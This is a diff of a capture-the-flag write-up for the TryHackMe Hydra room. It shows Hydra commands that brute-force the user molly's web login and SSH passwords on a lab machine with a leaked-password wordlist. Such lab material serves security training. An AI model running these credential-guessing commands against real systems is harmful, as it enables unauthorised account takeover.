@@ -2,16 +2,16 @@
 
 **Room Link:** [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)
 
-Add steps later
+
 
 **Use Hydra to bruteforce molly's web password. What is flag 1?**
 
-Web&#x20;
+Opened up the webconsole and tried entering the credentials to see what the request would look like. We can see the failed login attempt message and the fields used for login which we can used to craft our hydra command.
 
-hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^\&password=^PASS^:F=incorrect" -V
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+`hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V`
 
 **Use Hydra to bruteforce molly's SSH password. What is flag 2?**
 
-SSH&#x20;
-
-hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V
+`hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V`
